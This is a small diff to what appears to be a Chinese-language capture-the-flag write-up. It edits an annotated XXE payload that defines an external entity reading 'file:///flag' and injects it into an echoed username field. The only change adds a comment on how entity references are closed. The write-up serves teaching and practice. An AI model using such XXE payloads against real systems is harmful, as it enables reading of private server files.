@@ -89,7 +89,7 @@ Connection: close
 <!ENTITY flag SYSTEM  "file:///flag">  <!--定义子元素，只有一个，就是利用file协议读取的flag-->
 ]>
 <user>
-	<username>&flag;</username>   <!--&符号引用一般实体，上方定义实体名为flag，这里就写&flag。根据之前的测试，程序会把名字回显，因此把flag注入到username处就能回显出来结果-->
+	<username>&flag;</username>   <!--&符号引用一般实体，上方定义实体名为flag，这里就写&flag,实体前后一定是&;闭合。根据之前的测试，程序会把名字回显，因此把flag注入到username处就能回显出来结果-->
 	<password>1</password>
 </user>
 ```
